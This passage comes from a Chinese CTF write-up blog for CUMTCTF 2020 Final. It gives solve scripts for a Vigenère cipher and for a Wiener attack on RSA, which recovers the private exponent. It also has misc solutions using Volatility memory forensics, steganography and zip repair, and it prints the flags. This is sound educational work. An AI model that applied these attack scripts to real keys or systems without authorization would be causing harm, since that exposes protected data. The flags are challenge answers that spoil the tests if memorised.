class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cipher[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'a'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'A'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            explain += cipher[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> explain</span><br><span class="line"></span><br><span class="line">print(decrypt(cipher,<span class="string">'Lethelastctf'</span>))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>大数e</p>
<p>可以判断是wiener attack</p>
<p>上网直接down脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">Created on Dec 14, 2011</span><br><span class="line"></span><br><span class="line">@author: pablocelayes</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">def hack_RSA(e,n):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    for (k,d) in convergents:</span><br><span class="line">        </span><br><span class="line">        #check if d is actually the key</span><br><span class="line">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class="line">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class="line">            s &#x3D; n - phi + 1</span><br><span class="line">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class="line">            # has integer roots</span><br><span class="line">            discr &#x3D; s*s - 4*n</span><br><span class="line">            if(discr&gt;&#x3D;0):</span><br><span class="line">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class="line">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class="line">                    print(&quot;Hacked!&quot;)</span><br><span class="line">                    return d</span><br><span class="line"></span><br><span class="line"># TEST functions</span><br><span class="line"></span><br><span class="line">def test_hack_RSA():</span><br><span class="line">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class="line">    times &#x3D; 5</span><br><span class="line">    </span><br><span class="line">    while(times&gt;0):</span><br><span class="line">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class="line">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class="line">        print(&quot;d &#x3D; &quot;, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        if d &#x3D;&#x3D; hacked_d:</span><br><span class="line">            print(&quot;Hack WORKED!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Hack FAILED&quot;)</span><br><span class="line">        </span><br><span class="line">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class="line">        print(&quot;-------------------------&quot;)</span><br><span class="line">        times -&#x3D; 1</span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class="line">    #test_is_perfect_square()</span><br><span class="line">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">    m &#x3D; pow(c,d,n)</span><br><span class="line">    def num2str(num):</span><br><span class="line">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class="line">            return tmp.decode(&quot;hex&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class="line">    print(num2str(m))</span><br><span class="line">    #print(&quot;-------------------------&quot;)</span><br><span class="line">    #print(hack_RSA(e,n))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>转base64在转brainfk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个流量分析吧"><a href="#出个流量分析吧" class="headerlink" title="出个流量分析吧"></a>出个流量分析吧</h2><p>http流base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个LSB吧"><a href="#出个LSB吧" class="headerlink" title="出个LSB吧"></a>出个LSB吧</h2><p>LSB隐写</p>
<p>red green blue 0 0 0</p>
<p>保存得二维码 扫得flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个伪web吧"><a href="#出个伪web吧" class="headerlink" title="出个伪web吧"></a>出个伪web吧</h2><p>查看最新修改文件的时间</p>
<p>可以看到pass中有明显字符串cumt</p>
<p>然后拿flag包裹就行</p>
<h2 id="出个文档吧"><a href="#出个文档吧" class="headerlink" title="出个文档吧"></a>出个文档吧</h2><p>隐藏文字</p>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img imageinfo</span><br><span class="line">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure>
<p>可以看到有flag.png，输出一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure>
<p>可以看到一个图片扫一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure>
<p>解不出来</p>
<p>查看系统窗口列表，看有没有和flag有关的程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure>
<p>可以看到有一个程序dump一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure>
<p>用foremost分离一下</p>
<p>可以看到有图片</p>
<p>有key值和vi 然后就是AES加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">vi:1234567890123456</span><br><span class="line">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个压缩包吧"><a href="#出个压缩包吧" class="headerlink" title="出个压缩包吧"></a>出个压缩包吧</h2><p>010打开之后发现有secret.png没有伪加密，很明显子块被修改</p>
<p>7a改成74</p>
<p>分离出secret.png</p>
<p>发现是一张图片，但有两帧</p>
<p>脱到steg里面可以看到两个残缺的二维码</p>
<p>补全，就可以看到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>

        </div></article>
      <nav class="pagination"><a class="prev" href="/page/6/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text">Prev</span>
      </a>
    <a class="next" href="/page/8/">
        <span class="next-text">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></section></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:pz1olzy@aliyun.com" class="iconfont icon-email" title="email"></a>
        <a href="https://stackoverflow.com" target="_blank" rel="noopener" class="iconfont icon-stack-overflow" title="stack-overflow"></a>
        <a href="https://twitter.com" target="_blank" rel="noopener" class="iconfont icon-twitter" title="twitter"></a>
        <a href="https://google.com" target="_blank" rel="noopener" class="iconfont icon-google" title="google"></a>
        <a href="https://github.com/pz1o" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
        <a href="https://zhihu.com" target="_blank" rel="noopener" class="iconfont icon-zhihu" title="zhihu"></a>
        <a href="https://douban.com" target="_blank" rel="noopener" class="iconfont icon-douban" title="douban"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
  </span>

  <span class="copyright-year">&copy;2020 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">M1key</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
